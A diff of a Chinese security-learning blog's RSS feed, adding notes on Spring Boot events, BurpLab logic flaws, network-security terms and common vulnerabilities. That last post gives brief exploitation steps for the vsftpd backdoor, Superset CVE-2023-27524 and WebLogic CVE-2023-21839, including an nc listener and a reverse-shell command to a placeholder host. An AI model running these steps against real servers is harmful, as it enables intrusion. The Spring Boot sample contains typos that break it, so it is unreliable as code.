@@ -10,8 +10,118 @@
         </author>
         <description></description>
         <language>zh-CN</language>
-        <pubDate>Mon, 01 May 2023 14:26:13 +0800</pubDate>
-        <lastBuildDate>Mon, 01 May 2023 14:26:13 +0800</lastBuildDate>
+        <pubDate>Tue, 08 Aug 2023 14:42:56 +0800</pubDate>
+        <lastBuildDate>Tue, 08 Aug 2023 14:42:56 +0800</lastBuildDate>
+        <item>
+            <guid isPermalink="true">http://ericcd.com/2023/08/08/SpringBoot/</guid>
+            <title>SpringBoot</title>
+            <link>http://ericcd.com/2023/08/08/SpringBoot/</link>
+            <category term="web" scheme="http://ericcd.com/categories/web/" />
+            <category term="web" scheme="http://ericcd.com/tags/web/" />
+            <pubDate>Tue, 08 Aug 2023 14:42:56 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;记录一下后端开发过程中学到的知识&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;事件发送与监听&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#事件发送与监听&#34;&gt;#&lt;/a&gt; 事件发送与监听&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;首先需要自定义事件类，如下所示:&lt;br /&gt;
+、、、&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;public class CustomEvent extends ApplicationEvent {&lt;br /&gt;
+private String a;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;public CustomEvent (Object source, String a)&amp;#123;
+    super (source);
+    this.a = a;
+&amp;#125;
+
+public String getA ()&amp;#123;
+    return a;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;}&lt;br /&gt;
+、、、&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;
+&lt;p&gt;之后编写用于推送事件的 Service&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@Service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class EventPublisherService implements ApplicationEventPublisherAware&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   private ApplicationEventPublisher eventPublisher;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   @Override&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   public void setApplicationEventPublisher (ApplicationEventpublisher applicaitonEventPublisher)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       this.eventPublisher = applicationEventPublisher;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   public void publishPlayEvent (String a)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       CustomEvent customEvent = new CustomEvent (this, a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       eventPublisher.publishEvent (customEvent);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;最后编写监听器来实现操作:&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@EventListener&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public void handleChannelEvent (CustomEvent customEvent)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   String a= customEvent.a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   log.info (a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://ericcd.com/2023/06/26/web-vx/</guid>
+            <title>web 杂学</title>
+            <link>http://ericcd.com/2023/06/26/web-vx/</link>
+            <category term="web" scheme="http://ericcd.com/categories/web/" />
+            <category term="web" scheme="http://ericcd.com/tags/web/" />
+            <pubDate>Mon, 26 Jun 2023 11:16:13 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;记录从公众号看到的 web 杂学。&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;net-反序列化漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#net-反序列化漏洞&#34;&gt;#&lt;/a&gt; .net 反序列化漏洞&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS0zZHMuTkVU&#34;&gt;在.NET&lt;/span&gt; 处理 Ajax 应用的时候，通常序列化功能由 JavaSerializer 类提供，它是.NET2.0 之后内部实现的序列化功能的类，位于命名空间 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1N5c3RlbS5XZWI=&#34;&gt;System.Web&lt;/span&gt;..Serialization、通过 System.Web.Extensions 引用，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1vb3I4NHBnMGNyMmxiMHBlb3I2dHN3NWcuTmV0&#34;&gt;让开发者轻松实现.Net&lt;/span&gt; 中所有类型和 Json 数据之间的转换，但在某些场景下开发者使用 Deserialize 或 DeserializeObject 方法处理不安全的 Json 数据时会造成反序列化攻击从而实现远程 RCE 漏洞。&lt;/li&gt;
+&lt;li&gt;X-Ajaxpro-Method：用于指定在 Ajax 请求中要调用的服务器端方法的名称&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://ericcd.com/2023/05/06/socket/</guid>
+            <title>常见漏洞</title>
+            <link>http://ericcd.com/2023/05/06/socket/</link>
+            <category term="web" scheme="http://ericcd.com/categories/web/" />
+            <category term="web" scheme="http://ericcd.com/tags/web/" />
+            <pubDate>Sat, 06 May 2023 14:26:13 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;一些组件对应的常见漏洞&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;ftp-协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ftp-协议&#34;&gt;#&lt;/a&gt; FTP 协议&lt;/h1&gt;
+&lt;h2 id=&#34;基础爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基础爆破&#34;&gt;#&lt;/a&gt; 基础爆破&lt;/h2&gt;
+&lt;p&gt;可以使用 msf 中的 ftp 模块爆破。&lt;/p&gt;
+&lt;h2 id=&#34;ftp-匿名访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ftp-匿名访问&#34;&gt;#&lt;/a&gt; ftp 匿名访问&lt;/h2&gt;
+&lt;p&gt;用户名：anonymous 密码：为空或者任意邮箱&lt;/p&gt;
+&lt;h2 id=&#34;vsftpd234-笑脸漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vsftpd234-笑脸漏洞&#34;&gt;#&lt;/a&gt; vsftpd2.3.4 笑脸漏洞&lt;/h2&gt;
+&lt;p&gt;在 vsftpd 2.3.4 版本中，在登录输入用户名时输入 😃 类似于笑脸的符号，会导致服务处理开启 6200 后门端口，直接执行系统命令。攻击者可以使用 Metasploit 或 nc 连接后门端口利用。&lt;/p&gt;
+&lt;p&gt;使用以下命令可以优化伪终端：&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python –c “import pty;pty.spawn (‘/bin/bash’)”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;apache&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache&#34;&gt;#&lt;/a&gt; Apache&lt;/h1&gt;
+&lt;h2 id=&#34;cve-2023-27524&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2023-27524&#34;&gt;#&lt;/a&gt; CVE-2023-27524&lt;/h2&gt;
+&lt;h3 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
+&lt;p&gt;Apache Superset 2.0.1 版本及之前版本存在安全漏洞。&lt;br /&gt;
+该漏洞存在于 Apache Superset 中，是一个身份认证绕过漏洞。由于 Apache Superset 不安全的默认配置，未根据安装说明更改默认 SECRET_KEY 的系统受此漏洞影响，未经身份认证的远程攻击者利用此漏洞可以访问未经授权的资源或执行恶意代码。该漏洞的危害包括但不限于敏感数据窃取、任意代码执行等。&lt;/p&gt;
+&lt;h3 id=&#34;复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现&#34;&gt;#&lt;/a&gt; 复现&lt;/h3&gt;
+&lt;p&gt;通过以下仓库获取利用文件&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/horizon3ai/CVE-2023-27524&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 程序会返回一个 cookie 值，使用该 cookie 值替换自己的登录数据包 cookie，可以登录管理后台。&lt;/p&gt;
+&lt;h1 id=&#34;weblogic&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#weblogic&#34;&gt;#&lt;/a&gt; Weblogic&lt;/h1&gt;
+&lt;h2 id=&#34;cve-2023-21839&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2023-21839&#34;&gt;#&lt;/a&gt; CVE-2023-21839&lt;/h2&gt;
+&lt;h3 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
+&lt;p&gt;由于 Weblogic IIOP/T3 协议存在缺陷，当 IIOP/T3 协议开启时，允许未经身份验证的攻击者通过 IIOP/T3 协议网络访问攻击存在安全风险的 WebLogic Server，漏洞利用成功 WebLogic Server 可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。&lt;/p&gt;
+&lt;h3 id=&#34;复现-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现-2&#34;&gt;#&lt;/a&gt; 复现&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;从以下仓库下载 JNDIExploit&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/WhiteHSBG/JNDIExploit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;开启 jdni 监听&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -jar JNDIExploit-1.2-SNAPSHOT.jar -i xx.xx.xx.xx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 使用 nc 监听端口&lt;br /&gt;
+ &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 6789&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;获取 poc&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/4ra1n/CVE-2023-21839&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
+ 这个需要自行编译一下。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;反弹 shell&lt;br /&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CVE-2023-21839.exe -ip xx.xx.xx.xx -port 7001 -ldap ldap://xx.xx.xx.xx:1389/Basic/ReverseShell/xx.xx.xx.xx/6789&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">http://ericcd.com/2023/05/01/hvv-3/</guid>
             <title>应急响应基础知识</title>
@@ -382,6 +492,34 @@ crontab -l&lt;/p&gt;
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-5/</guid>
+            <title>BurpLab_5-Business_logic_vulnerabilities</title>
+            <link>http://ericcd.com/2022/12/22/BurpLab-5/</link>
+            <category term="web" scheme="http://ericcd.com/categories/web/" />
+            <category term="web" scheme="http://ericcd.com/tags/web/" />
+            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h1 id=&#34;excessive-trust-in-client-side-controls&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#excessive-trust-in-client-side-controls&#34;&gt;#&lt;/a&gt; Excessive trust in client-side controls&lt;/h1&gt;
+&lt;h1 id=&#34;failing-to-handle-unconventional-input&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#failing-to-handle-unconventional-input&#34;&gt;#&lt;/a&gt; Failing to handle unconventional input&lt;/h1&gt;
+&lt;p&gt;1.Are there any limits that are imposed on the data?&lt;br /&gt;
+2.What happens when you reach those limits?&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzMuSXM=&#34;&gt;3.Is&lt;/span&gt; any transformation or normalization being performed on your input?&lt;br /&gt;
+4. 注意边界值和特殊值&lt;br /&gt;
+ 5. 有后端前端不会检测用户输入的长度，后端也只是做了简单的截断处理，可以摸清后端的阶段规律，自定义一个适当长度的字符串，让它被阶段后成为我们的目标字符串&lt;/p&gt;
+&lt;h1 id=&#34;making-flawed-assumptions-about-user-behavior&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#making-flawed-assumptions-about-user-behavior&#34;&gt;#&lt;/a&gt; Making flawed assumptions about user behavior&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;When probing for logic flaws, you should try removing each parameter in turn and observing what effect this has on the response. You should make sure to:&lt;/p&gt;
+&lt;p&gt;a. Only remove one parameter at a time to ensure all relevant code paths are reached.&lt;br /&gt;
+b. Try deleting the name of the parameter as well as the value. The server will typically handle both cases differently.&lt;br /&gt;
+c. Follow multi-stage processes through to completion. Sometimes tampering with a parameter in one step will have an effect on another step further along in the workflow.&lt;/p&gt;
+&lt;h1 id=&#34;domain-specific-flaws&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#domain-specific-flaws&#34;&gt;#&lt;/a&gt; Domain-specific flaws&lt;/h1&gt;
+&lt;p&gt;1。利用优惠码的刷新漏洞重复使用同一个优惠码&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
             <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-2/</guid>
             <title>BurpLab_2-Authentication</title>
             <link>http://ericcd.com/2022/12/22/BurpLab-2/</link>
@@ -485,24 +623,6 @@ message 是传递的内容，targetOrigin 是可接收的窗口。&lt;br /&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://ericcd.com/2022/12/22/BurpLab-5/</guid>
-            <title>BurpLab_5-Business_logic_vulnerabilities</title>
-            <link>http://ericcd.com/2022/12/22/BurpLab-5/</link>
-            <category term="web" scheme="http://ericcd.com/categories/web/" />
-            <category term="web" scheme="http://ericcd.com/tags/web/" />
-            <pubDate>Thu, 22 Dec 2022 20:44:54 +0800</pubDate>
-            <description><![CDATA[ &lt;p&gt;记录在做 burp lab 时学会的知识点。&lt;br /&gt;
-&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;h1 id=&#34;excessive-trust-in-client-side-controls&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#excessive-trust-in-client-side-controls&#34;&gt;#&lt;/a&gt; Excessive trust in client-side controls&lt;/h1&gt;
-&lt;h1 id=&#34;failing-to-handle-unconventional-input&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#failing-to-handle-unconventional-input&#34;&gt;#&lt;/a&gt; Failing to handle unconventional input&lt;/h1&gt;
-&lt;p&gt;1.Are there any limits that are imposed on the data?&lt;br /&gt;
-2.What happens when you reach those limits?&lt;br /&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzMuSXM=&#34;&gt;3.Is&lt;/span&gt; any transformation or normalization being performed on your input?&lt;br /&gt;
-4. 注意边界值和特殊值&lt;br /&gt;
- 5. 有后端前端不会检测用户输入的长度，后端也只是做了简单的截断处理，可以摸清后端的阶段规律，自定义一个适当长度的字符串，让它被阶段后成为我们的目标字符串&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
             <guid isPermalink="true">http://ericcd.com/2022/11/30/XSS-cheet-sheet/</guid>
             <title>XSS_cheet_sheet</title>
             <link>http://ericcd.com/2022/11/30/XSS-cheet-sheet/</link>
@@ -527,16 +647,22 @@ message 是传递的内容，targetOrigin 是可接收的窗口。&lt;br /&gt;
             <description><![CDATA[ &lt;p&gt;面经总结&lt;br /&gt;
 &lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;h1 id=&#34;个人知识扫盲&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#个人知识扫盲&#34;&gt;#&lt;/a&gt; 个人知识扫盲&lt;/h1&gt;
-&lt;p&gt;1.waf&lt;br /&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;waf&lt;br /&gt;
 Web 应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web 应用防火墙是通过执行一系列针对 HTTP/HTTPS 的安全策略来专门为 Web 应用提供保护的一款产品。&lt;/p&gt;
-&lt;p&gt;2.ips&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ips&lt;br /&gt;
  入侵防御系统 (IPS: Intrusion Prevention System) 是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙 (Packet Filter, Application Gateway) 的补充。 入侵防御系统 (Intrusion-prevention system) 是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够及时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为，能够帮助组织识别恶意流量，并主动阻止此类流量进入其网络。。&lt;br /&gt;
 IPS 一般也是在网络层旁路，可以理解为具备阻断能力的 IDS，是 IDS 的升级版（也有 IDS 检测到攻击通知阻断设备执行阻断动作的设备联动模式），可以覆盖网络层和应用层。&lt;/p&gt;
-&lt;p&gt;3.ids&lt;br /&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ids&lt;br /&gt;
 IDS（intrusion detection system）入侵检测系统是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于，IDS 是一种积极主动的安全防护技术。&lt;br /&gt;
 IDS 工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击，主要关注网络层和传输层的数据包，如 IP、TCP、UDP 等协议。&lt;br /&gt;
 产品：奇安信天眼&lt;/p&gt;
-&lt;ol start=&#34;4&#34;&gt;
+&lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;旁路部署&lt;br /&gt;
 旁路部署是指安全设备在网络结构中处于旁路状态。在旁路模式下，安全设备只需要连接到交换机的指定镜像端口，所以形象的称之为 “旁路监控”；而串联模式一般是通过网关或者网桥的模式来进行监控，由于监控设备做了网关或者网桥，所以形象的称之为 “串联监控”。&lt;br /&gt;
@@ -562,39 +688,57 @@ IDS 工作在网络层，旁路部署，通过抓取和分析网络流量来发�
 &lt;p&gt;数据包从前端到后端的流程&lt;br /&gt;
 客户端向服务器发起请求，请求会被封装成数据包。数据包会经过客户端的网卡，然后通过网线传输到路由器。路由器会根据目标 IP 地址，将数据包转发到下一个路由器或者直接转发到目标服务器。数据包到达目标服务器后，会被服务器的网卡接收。服务器会对数据包进行解析，然后根据请求内容进行处理。服务器处理完请求后，会将响应结果封装成数据包，然后通过网卡发送回客户端。数据包会经过路由器，然后通过网线传输到客户端的网卡。客户端的网卡接收到数据包后，会将数据包传递给操作系统内核。操作系统内核会对数据包进行解析，然后将响应结果交给应用程序。&lt;/p&gt;
 &lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;9.NAT&lt;br /&gt;
+&lt;li&gt;
+&lt;p&gt;NAT&lt;br /&gt;
 NAT 是指网络地址转换，是一种网络协议。当在专用网内部的一些主机本来已经分配到了本地 IP 地址（即仅在本专用网内使用的专用地址），但又想和因特网上的主机通信（并不需要加密）时，可使用 NAT 方法。这种方法需要在专用网（私网 IP）连接到因特网（公网 IP）的路由器上安装 NAT 软件。装有 NAT 软件的路由器叫做 NAT 路由器，它至少有一个有效的外部全球 IP 地址（公网 IP 地址）。这样，所有使用本地地址（私网 IP 地址）的主机在和外界通信时，都要在 NAT 路由器上将其本地地址转换成全球 IP 地址，才能和因特网连接。&lt;br /&gt;
 NAT 的实现方式有三种，即静态转换 Static Nat、动态转换 Dynamic Nat 和端口多路复用 OverLoad&lt;br /&gt;
  静态转换是指将内部网络的私有 IP 地址转换为公有 IP 地址，IP 地址对是一对一的，是一成不变的，某个私有 IP 地址只转换为某个公有 IP 地址。借助于静态转换，可以实现外部网络对内部网络中某些特定设备（如服务器）的访问。&lt;br /&gt;
 动态转换是指将内部网络的私有 IP 地址转换为公用 IP 地址时，IP 地址是不确定的，是随机的，所有被授权访问上 Internet 的私有 IP 地址可随机转换为任何指定的合法 IP 地址。也就是说，只要指定哪些内部地址可以进行转换，以及用哪些合法地址作为外部地址时，就可以进行动态转换。动态转换可以使用多个合法外部地址集。当 ISP 提供的合法 IP 地址略少于网络内部的计算机数量时。可以采用动态转换的方式。&lt;br /&gt;
-端口多路复用（Port address Translation,PAT）是指改变外出数据包的源端口并进行端口转换，即端口地址转换（PAT，Port Address Translation）. 采用端口多路复用方式。内部网络的所有主机均可共享一个合法外部 IP 地址实现对 Internet 的访问，从而可以最大限度地节约 IP 地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自 internet 的攻击。因此，网络中应用最多的就是端口多路复用方式。例如，假设有两个内部主机 A 和 B，它们都使用私有 IP 地址 192.168.1.1 和 192.168.1.2，并且它们都要访问外部网络。路由器使用公网 IP 地址 203.0.113.1，并且已经配置了 PAT。当主机 A 发送数据包到外部网络时，路由器会将源 IP 地址和源端口号转换为 203.0.113.1:10000，并将数据包发送到外部网络。当主机 B 发送数据包到外部网络时，路由器会将源 IP 地址和源端口号转换为 203.0.113.1:10001，并将数据包发送到外部网络。当外部网络返回数据包时，路由器会根据目标端口号将数据包转发到相应的内部主机。&lt;/p&gt;
-&lt;p&gt;10.hids&lt;br /&gt;
